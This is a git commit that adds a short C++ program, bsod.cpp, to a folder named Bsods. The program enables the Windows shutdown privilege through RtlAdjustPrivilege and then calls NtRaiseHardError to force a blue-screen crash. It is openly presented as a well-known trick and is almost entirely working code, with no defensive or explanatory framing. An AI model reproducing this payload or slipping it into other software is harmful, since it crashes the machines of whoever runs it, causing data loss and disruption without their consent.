32803f976fa5a86626f54b8d734fef114d81def4
astr0 <68482847+vxcute@users.noreply.github.com>
2021-05-17 00:59:00 +0200

    Create bsod.cpp

---
+++ Bsods/bsod.cpp
@@ -0,0 +1,44 @@
+// wellknown one
+
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+typedef  NTSTATUS (NTAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
+
+typedef NTSTATUS(NTAPI* _NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, 
+	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
+
+#define SeShutDownPrivilage 19
+
+void bsod()
+{
+	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+
+	BOOLEAN OldValue;
+
+	ULONG Respone;
+
+	if (ntdll != nullptr) {
+
+		_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+
+		_NtRaiseHardError NtRaiseHardError = (_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+
+		// Enable SeShutDownPrivilage 
+
+		RtlAdjustPrivilege(SeShutDownPrivilage, true, false, &OldValue);
+
+    // ErrorStatus Can Be Any Value U Don't Have To Put STATUS_ASSERTION_FAILURE
+    
+		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &Respone);
+	}
+}
+
+int main()
+{
+	bsod();
+	return 0;
+}
